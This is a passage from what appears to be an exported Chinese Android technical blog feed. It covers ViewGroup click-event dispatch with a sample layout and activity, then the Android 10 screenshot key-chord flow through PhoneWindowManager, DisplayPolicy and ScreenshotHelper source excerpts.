class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">&quot;@+id/my_layout&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:app</span>=<span class="string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:focusableInTouchMode</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">&quot;vertical&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/button1&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;按钮1&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/button2&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;按钮2&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>核心代码：MainActivity.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">  Button button1,button2;</span><br><span class="line">  ViewGroup myLayout;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">      <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">      setContentView(R.layout.activity_main);</span><br><span class="line">      button1 = (Button)findViewById(R.id.button1);</span><br><span class="line">      button2 = (Button)findViewById(R.id.button2);</span><br><span class="line">      myLayout = (LinearLayout)findViewById(R.id.my_layout);</span><br><span class="line">      <span class="comment">// 1.为ViewGroup布局设置监听事件</span></span><br><span class="line">      myLayout.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">              Log.d(<span class="string">&quot;TAG&quot;</span>, <span class="string">&quot;点击了ViewGroup&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">      <span class="comment">// 2. 为按钮1设置监听事件</span></span><br><span class="line">      button1.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">              Log.d(<span class="string">&quot;TAG&quot;</span>, <span class="string">&quot;点击了button1&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">      <span class="comment">// 3. 为按钮2设置监听事件</span></span><br><span class="line">      button2.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">              Log.d(<span class="string">&quot;TAG&quot;</span>, <span class="string">&quot;点击了button2&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-测试结果"><a href="#3-测试结果" class="headerlink" title="3. 测试结果"></a>3. 测试结果</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 点击按钮1，输出如下</span><br><span class="line">点击了button1</span><br><span class="line">// 点击按钮2，输出如下</span><br><span class="line">点击了button2</span><br><span class="line">// 点击空白处，输出如下</span><br><span class="line">点击了ViewGroup</span><br></pre></td></tr></table></figure><h4 id="4-结果分析"><a href="#4-结果分析" class="headerlink" title="4. 结果分析"></a>4. 结果分析</h4><ul><li>点击Button时，因为ViewGroup默认不拦截，所以事件会传递到子View Button，于是执行Button.onClick()。</li><li>此时ViewGroup. dispatchTouchEvent()会直接返回true，所以ViewGroup自身不会处理该事件，于是ViewGroupLayout的dispatchTouchEvent()不会执行，所以注册的onTouch()不会执行，即onTouchEvent()-&gt; performClick()-&gt; onClick()整个链路都不会执行，所以最后不会执行ViewGroup设置的onClick()里。</li><li>点击空白区域时，ViewGroup. dispatchTouchEvent()里遍历所有子View希望找到被点击子View时找不到，所以ViewGroup自身会处理该事件，于是执行onTouchEvent() -&gt; performClick() -&gt; onClick()，最终执行ViewGroupLayout的设置的onClick()。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> SystemUI </tag>
            
            <tag> framework </tag>
            
            <tag> Launcher </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 10.0 截屏流程</title>
      <link href="/2023/12/16/2023-12-16/"/>
      <url>/2023/12/16/2023-12-16/</url>
      
        <content type="html"><![CDATA[<p>通常未通过特殊定制的 Android 系统，截屏都是经过同时按住音量下键和电源键来截屏。本篇文章就只讨论使用这些特殊按键来进行截屏。<br>这里我们就要明白事件是在哪里进行分发拦截的。通过源码的分析，我们发现是在PhoneWindowManager.java 中。<br>PhoneWindowManager#interceptKeyBeforeQueueing()<br><strong>frameworks/base/services/core/java/com/android/server/policy/PhoneWindowManager.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">interceptKeyBeforeQueueing</span><span class="params">(KeyEvent event, <span class="type">int</span> policyFlags)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!mSystemBooted) &#123;</span><br><span class="line">        <span class="comment">// If we have not yet booted, don&#x27;t let key events do anything.</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">    <span class="comment">// Handle special keys.</span></span><br><span class="line">    <span class="keyword">switch</span> (keyCode) &#123;</span><br><span class="line">         ......</span><br><span class="line">        <span class="keyword">case</span> KeyEvent.KEYCODE_VOLUME_DOWN:</span><br><span class="line">        <span class="keyword">case</span> KeyEvent.KEYCODE_VOLUME_UP:</span><br><span class="line">        <span class="keyword">case</span> KeyEvent.KEYCODE_VOLUME_MUTE: &#123;</span><br><span class="line">            <span class="comment">// 按下音量键调用</span></span><br><span class="line">            handleVolumeKey(event, policyFlags);</span><br><span class="line">            ......</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">case</span> KeyEvent.KEYCODE_POWER: &#123;</span><br><span class="line">            ......</span><br><span class="line">            <span class="keyword">if</span> (down) &#123;</span><br><span class="line">                <span class="comment">// 按下电源键将调用</span></span><br><span class="line">                interceptPowerKeyDown(event, interactive);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;          </span><br><span class="line">                interceptPowerKeyUp(event, interactive, canceled);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1、电源键处理"><a href="#1、电源键处理" class="headerlink" title="1、电源键处理"></a>1、电源键处理</h3><p>PhoneWindowManager#interceptPowerKeyDown()<br><strong>frameworks/base/services/core/java/com/android/server/policy/PhoneWindowManager.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">interceptPowerKeyDown</span><span class="params">(KeyEvent event, <span class="type">boolean</span> interactive)</span> &#123;</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">    <span class="comment">// Latch power key state to detect screenshot chord.</span></span><br><span class="line">    <span class="keyword">if</span> (interactive &amp;&amp; !mScreenshotChordPowerKeyTriggered</span><br><span class="line">            &amp;&amp; (event.getFlags() &amp; KeyEvent.FLAG_FALLBACK) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// power键按下的标志</span></span><br><span class="line">        mScreenshotChordPowerKeyTriggered = <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">// 获取 Power 键的触发时间</span></span><br><span class="line">        mScreenshotChordPowerKeyTime = event.getDownTime();</span><br><span class="line">        <span class="comment">// 处理屏幕截图事件</span></span><br><span class="line">        interceptScreenshotChord();</span><br><span class="line">        <span class="comment">// 这个方法应该是消耗、拦截事件的，避免改变音量、铃声等。</span></span><br><span class="line">        interceptRingerToggleChord();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>interceptScreenshotChord()该方法下面再说，先介绍电源按键、音量按键的处理。</p><h3 id="2、音量键处理"><a href="#2、音量键处理" class="headerlink" title="2、音量键处理"></a>2、音量键处理</h3><p>PhoneWindowManager#handleVolumeKey()<br><strong>frameworks/base/services/core/java/com/android/server/policy/PhoneWindowManager.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleVolumeKey</span><span class="params">(KeyEvent event, <span class="type">int</span> policyFlags)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">down</span> <span class="operator">=</span> event.getAction() == KeyEvent.ACTION_DOWN;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">keyCode</span> <span class="operator">=</span> event.getKeyCode();</span><br><span class="line">    <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">interactive</span> <span class="operator">=</span> (policyFlags &amp; FLAG_INTERACTIVE) != <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (keyCode == KeyEvent.KEYCODE_VOLUME_DOWN) &#123;</span><br><span class="line">        <span class="keyword">if</span> (down) &#123;</span><br><span class="line">            <span class="comment">// Any activity on the vol down button stops the ringer toggle shortcut</span></span><br><span class="line">            cancelPendingRingerToggleChordAction();</span><br><span class="line">            <span class="keyword">if</span> (interactive &amp;&amp; !mScreenshotChordVolumeDownKeyTriggered</span><br><span class="line">                    &amp;&amp; (event.getFlags() &amp; KeyEvent.FLAG_FALLBACK) == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// Volume键按下的标志</span></span><br><span class="line">                mScreenshotChordVolumeDownKeyTriggered = <span class="literal">true</span>;</span><br><span class="line">                <span class="comment">// 获取 Volume 键的触发时间</span></span><br><span class="line">                mScreenshotChordVolumeDownKeyTime = event.getDownTime();</span><br><span class="line">                <span class="comment">// 赋值  false 该属性为了防止截屏的时候音量下键生效出现调节音量的 dialog 状态值</span></span><br><span class="line">                mScreenshotChordVolumeDownKeyConsumed = <span class="literal">false</span>;</span><br><span class="line">                <span class="comment">// 防止触发 Power  键长按功能</span></span><br><span class="line">                cancelPendingPowerKeyAction();</span><br><span class="line">                <span class="comment">//处理屏幕截图事件</span></span><br><span class="line">                interceptScreenshotChord();</span><br><span class="line">                <span class="comment">// 拦截相关快捷键</span></span><br><span class="line">                interceptAccessibilityShortcutChord();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             <span class="comment">// 省略部分代码......</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (keyCode == KeyEvent.KEYCODE_VOLUME_UP) &#123;</span><br><span class="line">         <span class="comment">// 省略部分代码......</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3、截屏事件处理-interceptScreenshotChord"><a href="#3、截屏事件处理-interceptScreenshotChord" class="headerlink" title="3、截屏事件处理 interceptScreenshotChord()"></a>3、截屏事件处理 interceptScreenshotChord()</h3><p>PhoneWindowManager#interceptScreenshotChord()<br><strong>frameworks/base/services/core/java/com/android/server/policy/PhoneWindowManager.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">interceptScreenshotChord</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">       * if 判断参数介绍</span></span><br><span class="line"><span class="comment">       * mScreenshotChordEnabled 其值为mContext.getResources().getBoolean(com.android.internal.R.bool.config_enableScreenshotChord);</span></span><br><span class="line"><span class="comment">       * mScreenshotChordVolumeDownKeyTriggered 音量下键按下时值为true</span></span><br><span class="line"><span class="comment">       * mScreenshotChordPowerKeyTriggered  电源键按下时值为true</span></span><br><span class="line"><span class="comment">       * mA11yShortcutChordVolumeUpKeyTriggered 音量上(加)键抬起时为false , 按下时为true</span></span><br><span class="line"><span class="comment">       **/</span></span><br><span class="line">    <span class="keyword">if</span> (mScreenshotChordEnabled</span><br><span class="line">            &amp;&amp; mScreenshotChordVolumeDownKeyTriggered &amp;&amp; mScreenshotChordPowerKeyTriggered</span><br><span class="line">            &amp;&amp; !mA11yShortcutChordVolumeUpKeyTriggered) &#123;</span><br><span class="line">        <span class="comment">// 获取当前时间</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">long</span> <span class="variable">now</span> <span class="operator">=</span> SystemClock.uptimeMillis();</span><br><span class="line">        <span class="comment">// 当前时间小于 音量下键按下时间 + 150ms</span></span><br><span class="line">        <span class="comment">// 当前时间小于 power键按下时间 + 150ms</span></span><br><span class="line">        <span class="keyword">if</span> (now &lt;= mScreenshotChordVolumeDownKeyTime + SCREENSHOT_CHORD_DEBOUNCE_DELAY_MILLIS</span><br><span class="line">                &amp;&amp; now &lt;= mScreenshotChordPowerKeyTime</span><br><span class="line">                + SCREENSHOT_CHORD_DEBOUNCE_DELAY_MILLIS) &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">inLongScreenshot</span> <span class="operator">=</span> Settings.System.getIntForUser(mContext.getContentResolver(),</span><br><span class="line">                    LONGSCREENSHOT_SETTING, <span class="number">0</span>, UserHandle.USER_CURRENT_OR_SELF) == <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (hasInPowerUtrlSavingMode() || inLongScreenshot) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 长按音量下键，达到截屏条件，将该事件消费掉。</span></span><br><span class="line">            mScreenshotChordVolumeDownKeyConsumed = <span class="literal">true</span>;</span><br><span class="line">            <span class="comment">// 防止触发 Power  键长按功能</span></span><br><span class="line">            cancelPendingPowerKeyAction();</span><br><span class="line">            <span class="comment">// 设置截图的类型，TAKE_SCREENSHOT_FULLSCREEN 为全屏</span></span><br><span class="line">            mScreenshotRunnable.setScreenshotType(TAKE_SCREENSHOT_FULLSCREEN);</span><br><span class="line">            <span class="comment">// 截图的方式，(例如：按键、三指下滑 等等)</span></span><br><span class="line">            mScreenshotRunnable.setScreenshotSource(SCREENSHOT_KEY_CHORD);</span><br><span class="line">            <span class="comment">//执行 mScreenshotRunnable</span></span><br><span class="line">            mHandler.postDelayed(mScreenshotRunnable, getScreenshotChordLongPressDelay());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续查看ScreenshotRunnable，此时会一步步向下调用，最终到SystemUI。<br><strong>frameworks/base/services/core/java/com/android/server/policy/PhoneWindowManager.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">ScreenshotRunnable</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">mScreenshotType</span> <span class="operator">=</span> TAKE_SCREENSHOT_FULLSCREEN;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">mScreenshotSource</span> <span class="operator">=</span> SCREENSHOT_KEY_OTHER;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setScreenshotType</span><span class="params">(<span class="type">int</span> screenshotType)</span> &#123;</span><br><span class="line">        mScreenshotType = screenshotType;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setScreenshotSource</span><span class="params">(<span class="type">int</span> screenshotSource)</span> &#123;</span><br><span class="line">        mScreenshotSource = screenshotSource;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 回调到 DisplayPolicy.java</span></span><br><span class="line">        mDefaultDisplayPolicy.takeScreenshot(mScreenshotType, mScreenshotSource);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>DisplayPolicy#takeScreenshot()<br><strong>frameworks/base/services/core/java/com/android/server/wm/DisplayPolicy.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 请求截取屏幕截图</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">takeScreenshot</span><span class="params">(<span class="type">int</span> screenshotType, <span class="type">int</span> source)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (mScreenshotHelper != <span class="literal">null</span>) &#123;</span><br><span class="line">        mScreenshotHelper.takeScreenshot(screenshotType,</span><br><span class="line">                mStatusBar != <span class="literal">null</span> &amp;&amp; mStatusBar.isVisibleLw(),</span><br><span class="line">                mNavigationBar != <span class="literal">null</span> &amp;&amp; mNavigationBar.isVisibleLw(),</span><br><span class="line">                source, mHandler, <span class="literal">null</span> <span class="comment">/* completionConsumer */</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续往下看ScreenshotHelper#takeScreenshot()<br><strong>frameworks/base/core/java/com/android/internal/util/ScreenshotHelper.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 请求截取屏幕截图</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">takeScreenshot</span><span class="params">(<span class="keyword">final</span> <span class="type">int</span> screenshotType, <span class="keyword">final</span> <span class="type">boolean</span> hasStatus,</span></span><br><span class="line"><span class="params">        <span class="keyword">final</span> <span class="type">boolean</span> hasNav, <span class="type">int</span> source, <span class="meta">@NonNull</span> Handler handler,</span></span><br><span class="line"><span class="params">        <span class="meta">@Nullable</span> Consumer&lt;Uri&gt; completionConsumer)</span> &#123;</span><br><span class="line">    <span class="type">ScreenshotRequest</span> <span class="variable">screenshotRequest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ScreenshotRequest</span>(source, hasStatus, hasNav);</span><br><span class="line">    takeScreenshot(screenshotType, SCREENSHOT_TIMEOUT_MS, handler, screenshotRequest,</span><br><span class="line">            completionConsumer);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//到了 Binder调用环节, 此为客户端, 服务端为SystemUI中的 TakeScreenshotService</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">takeScreenshot</span><span class="params">(<span class="keyword">final</span> <span class="type">int</span> screenshotType, <span class="type">long</span> timeoutMs, <span class="meta">@NonNull</span> Handler handler,</span></span><br><span class="line"><span class="params">            ScreenshotRequest screenshotRequest, <span class="meta">@Nullable</span> Consumer&lt;Uri&gt; completionConsumer)</span> &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (mScreenshotLock) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">Runnable</span> <span class="variable">mScreenshotTimeout</span> <span class="operator">=</span> () -&gt; &#123;</span><br><span class="line">                <span class="keyword">synchronized</span> (mScreenshotLock) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (mScreenshotConnection != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="comment">// 在获取屏幕截图捕获响应之前超时</span></span><br><span class="line">                        Log.e(TAG, <span class="string">&quot;Timed out before getting screenshot capture response&quot;</span>);</span><br><span class="line">                        <span class="comment">// 重置连接</span></span><br><span class="line">                        resetConnection();</span><br><span class="line">                        <span class="comment">// 通知截屏错误</span></span><br><span class="line">                        notifyScreenshotError();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (completionConsumer != <span class="literal">null</span>) &#123;</span><br><span class="line">                    completionConsumer.accept(<span class="literal">null</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="type">Message</span> <span class="variable">msg</span> <span class="operator">=</span> Message.obtain(<span class="literal">null</span>, screenshotType, screenshotRequest);</span><br><span class="line">            <span class="type">Handler</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Handler</span>(handler.getLooper()) &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span 